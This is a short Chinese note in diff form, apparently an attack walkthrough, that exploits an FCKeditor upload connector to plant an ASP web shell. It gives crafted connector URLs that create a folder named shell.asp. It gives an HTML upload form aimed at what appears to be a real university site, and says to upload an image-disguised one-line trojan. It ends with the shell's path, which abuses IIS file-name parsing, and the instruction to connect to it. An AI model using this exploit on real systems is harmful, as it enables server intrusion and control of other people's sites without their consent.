@@ -1,0 +1,25 @@
+
+很简单的一个问题，又是死在fckeditor编辑器上。
+http://www.xxx.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=FileUpload&Type=Media&CurrentFolder=shell.asp&NewFolderName=z&uuid=1244789975684
+
+
+http://jwst.gzauto.edu.cn//fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=FileUpload&Type=Media&CurrentFolder=shell.asp&NewFolderName=z&uuid=1244789975684
+
+
+
+
+
+fckeditor/editor/filemanager/connectors/aspx/connector.aspx
+
+建立一文件夹shell.asp
+
+构造一表单，上传图片一句话马
+<form id="frmUpload" enctype="multipart/form-data" action="http://jwst.gzauto.edu.cn//fckeditor/editor/filemanager/connectors/aspx/connector.aspx?Command=FileUpload&Type=Media&CurrentFolder=shell.asp" method="post"> 
+上传文件:<br>
+<input type="file" name="NewFile" size="50"><br>
+<input id="btnUpload" type="submit" value="Upload">
+
+
+http://www.xxx.com/userfiles/media/shell.asp/test_asp;1.jpg
+连接之。。。。
+
